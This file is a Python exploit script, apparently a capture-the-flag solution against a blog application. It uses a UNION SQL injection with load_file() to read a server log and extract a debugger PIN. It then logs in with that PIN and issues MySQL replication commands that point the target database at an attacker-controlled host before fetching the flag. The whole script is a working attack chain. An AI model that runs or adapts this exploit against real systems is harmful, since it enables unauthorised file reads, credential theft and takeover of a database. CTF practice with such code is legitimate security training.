import requests,re
import time

#题目地址
SERVER_ADDR = "http://192.168.1.1:80"
#自己启动docker的地址 端口默认3306
DOCKER_ADDR="8.8.8.8"



def get_pin():
    resp = requests.get(SERVER_ADDR + "/post/11111111%20union%20select%201,load_file('%2fhome%2fezblog%2f.pm2%2flogs%2fmain-out.log'),1/edit")
    data = resp.text
    # print(data)
    # Debugger PIN: bb363206-4e17-41d0-92c0-4626f451b908\n"
    PIN_RE = r'Debugger PIN: ([a-f0-9-]+)'
    pin = re.findall(PIN_RE, data)[0]
    return pin

def get_token(pin):
    resp = requests.post(SERVER_ADDR + "/api/debugger/auth",data={"username":"debugger","password":pin})
    data = resp.json()
    token = data["data"]
    return token

def execute_sql_command(token,cmd):
    resp = requests.post(SERVER_ADDR + "/api/debugger/sql/execute",data={"code":cmd},headers={"Authorization":"" + token})
    data = resp.json()
    return data['data']

def render_template(token,file):
    resp = requests.post(SERVER_ADDR + "/api/debugger/template/test",data={"file":file},headers={"Authorization":"" + token})
    data = resp.text
    return data

if __name__ == "__main__":
    pin = get_pin()
    print("pin: " + pin)
    token = get_token(pin)
    print("token: " + token)
    cmd = "stop SLAVE;"
    r = execute_sql_command(token,cmd)
    print(r)
    cmd = "CHANGE MASTER TO MASTER_HOST='"+DOCKER_ADDR+"', MASTER_USER='admin', MASTER_PASSWORD='123456', MASTER_LOG_FILE='mysql-bin.000001', MASTER_LOG_POS=211;"
    r = execute_sql_command(token,cmd)
    print(r)
    cmd = "START SLAVE;"
    r = execute_sql_command(token,cmd)
    print(r)
    time.sleep(10)
    cmd = "show slave status;"
    r = execute_sql_command(token,cmd)
    print(r)
    #assert 'Slave has read all relay log; waiting for more updates' in str(r), "exp的docker没开"
    flag = render_template(token,"114")
    print(flag)